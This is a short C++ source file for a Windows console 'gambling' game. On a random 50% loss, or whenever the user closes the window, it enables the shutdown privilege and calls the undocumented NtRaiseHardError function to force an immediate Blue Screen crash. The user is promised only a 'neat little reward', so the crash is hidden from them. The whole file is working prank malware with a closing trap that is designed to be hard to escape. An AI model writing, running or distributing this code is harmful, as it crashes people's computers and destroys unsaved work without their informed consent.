#include <Windows.h>
#include <iostream>
#include <cstdlib>
#include <ctime>

#pragma comment(lib, "ntdll.lib")

using namespace std;

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrThread, PBOOLEAN StatusPointer);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG Unless1, ULONG Unless2, PULONG_PTR Unless3, ULONG ValidResponseOption, PULONG ResponsePointer);

static void Win() {
    std::cout << "You didn't fuck up. Congrats!" << std::endl;

    std::cout << "Press Enter to exit...\n";
    std::cin.get();
}

static void Lose() {
    std::cout << "You fucked up." << std::endl;
    BOOLEAN PrivilegeState = FALSE;
    ULONG ErrorResponse = 0;
    RtlAdjustPrivilege(19, TRUE, FALSE, &PrivilegeState);
    NtRaiseHardError(STATUS_IN_PAGE_ERROR, 0, 0, NULL, 6, &ErrorResponse);
}

BOOL WINAPI ConsoleHandler(DWORD dwCtrlType) {
    switch (dwCtrlType) {
    case CTRL_CLOSE_EVENT:
        Lose();
        return TRUE;
    default:
        return FALSE;
    }
}

int main() {
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);

    std::srand(std::time(nullptr));

    std::cout << "Welcome to Windows Gambler, if you lose, you get a neat little reward!" << std::endl;
    std::cout << "Press Enter to start\n";
    std::cin.get();

    int result = std::rand() % 2;

    if (result == 0) {
        Win();
    }
    else {
        Lose();
    }

    return 0;
}
